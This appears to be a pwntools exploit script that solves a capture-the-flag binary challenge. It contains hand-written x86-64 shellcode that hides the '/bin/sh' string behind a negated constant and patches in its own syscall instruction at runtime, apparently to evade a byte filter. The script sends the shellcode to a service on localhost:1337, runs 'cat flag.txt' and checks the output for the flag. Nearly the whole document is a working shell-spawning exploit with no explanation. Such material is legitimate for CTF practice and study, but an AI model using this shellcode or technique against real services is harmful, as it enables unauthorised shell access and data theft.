#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./challenge/chal
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or './challenge/chal')

# Many built-in settings can be controlled on the command-line and show up
# in "args". For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
  '''Start the exploit against the target.'''
  if args.GDB:
    return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
  else:
    return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
break *0x0000000000401086
continue
s 15
'''.format(**locals())

#===========================================================
#          EXPLOIT GOES HERE
#===========================================================
# Arch:   amd64-64-little
# RELRO:  No RELRO
# Stack:  No canary found
# NX:    NX unknown - GNU_STACK missing
# PIE:   No PIE (0x400000)
# Stack:  Executable
# RWX:   Has RWX segments

# shellcode = asm(shellcraft.sh())
# payload = fit({
#   32: 0xdeadbeef,
#   'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

assembly = ''' 
  xor eax, eax
  mov rbx, 0xFF978CD091969DD1
  neg rbx
  push rbx
  ;mov rdi, rsp
  push rsp
  pop rdi
  cdq
  push rdx
  push rdi
  ;mov rsi, rsp
  push rsp
  pop rsi
  mov al, 0x3b

  mov r14, 0x287
  add r14,0x287
  add r14, 0x1
  /*mov QWORD PTR [rsp + 0x64], r14*/
  /* mov r15, rsp*/
  /*add r15, 0x64*/
  /* jmp r15*/
  mov [rip+0x2], r14w
  nop
  nop
  nop
  nop
  '''

asm(assembly)

#io = start()
#gdb.attach(io,'b _start')
io = remote('localhost', 1337)
io.recvline()
io.sendline(asm(assembly))
sleep(.5)
io.sendline(b"cat flag.txt")
sleep(.5)

result = str(io.recv().decode('ascii'))
if 'wctf' in result:
    print(result)
    exit(0)
else:
    log.info("failed")
exit(1)
